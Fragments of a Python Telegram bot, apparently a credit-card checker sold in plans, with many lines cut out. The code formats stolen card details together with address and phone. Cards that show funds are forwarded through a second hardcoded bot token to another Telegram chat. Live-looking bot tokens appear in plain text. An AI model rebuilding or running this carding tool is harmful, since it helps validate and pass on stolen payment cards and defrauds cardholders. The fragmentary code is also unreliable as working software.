...
stopuser = {}
token = '8932986199:AAEvUQ2srcLfYoQma2wQMlrkRJ-N8Z1LqXE'
	...
	def my_function():
	  ...
	  "timer": "none",
		...
		if BL == '𝗙𝗥𝗘𝗘':	
			...
			video_url = f'https://t.me/zdtuuu/35'
...
User Bot : @TomeCheckerBot {BL}</b>
	''',reply_markup=keyboard)
		...
		video_url = f'https://t.me/zdtuuu/35'
		bot.send_video(chat_id=message.chat.id, video=video_url, caption='''𝘾𝙡𝙞𝙘𝙠 /cmds 𝙏𝙤 𝙑𝙞𝙚𝙬 𝙏𝙝𝙚 𝗖𝙤𝙢𝙢𝙖𝙣𝙙𝙨 𝙊𝙧 𝙎𝙚𝙣𝙙 𝙏𝙝𝙚 🇫🇮𝙡𝙚 𝘼𝙣𝙙 𝙄 𝙒𝙞𝙡𝙡 𝘾𝙝𝙚𝙘𝙠 𝙄𝙩''',reply_markup=keyboard)
	my_thread = threading.Thread(target=my_function)
	my_thread.start()

@bot.message_handler(commands=["cmds"])
def start_cmds(message):
	with open('data.json', 'r') as file:
		json_data = json.load(file)
	id=message.from_user.id
	try:BL=(json_data[str(id)]['plan'])
...
𝗧𝗛𝗘𝗦𝗘 𝗔𝗥𝗘 𝗧𝗛𝗘 𝘾𝙃𝘼𝙉𝙉𝙀𝙇'𝚂 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 
━━━━━━━━━━━━
...
{cc}|{street}|{city}|{postal}|{phone}|UNITED STATES
		...
		tly = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={acb}&text={mag}"
		requests.post(tly, params={"parse_mode": "HTML"})
		requests.post(tlg, params={"parse_mode": "HTML"})
		bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=msg)
	elif "funds" in last:
		tok = '7414864964:AAFf0oq3edv54z1yWyrE1UlWi2ML9YwjRHw'
...
◆ 𝑩𝑰𝑵 ➜ <code>{cc[:6]} - {card_type} - {brand}</code>
◆ 𝑩𝑨𝑵𝙺 ➜ <code>{bank}</code>
◆ 𝑪??𝑼𝑵𝑻𝑹𝒀 ➜ <code>{country} - {country_flag}</code> 
- - - - - - - - - - - - - - - - - - - - - - -
◆ 𝑩𝒀: @FJ0FF
◆ 𝑻𝑨𝑲𝑬𝑵 ➜ {"{:.1f}".format(execution_time)} secounds .</b>'''
	msgd=f'''<b>𝗥𝗘𝗝𝗘𝗖𝗧𝗘𝗗 ❌
...
def menu_callback_stop(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'

print("تم تشغيل البوت بنجاح")

# تشغيل البوت بالطريقة الصحيحة والآمنة لمنع أخطاء التعارض
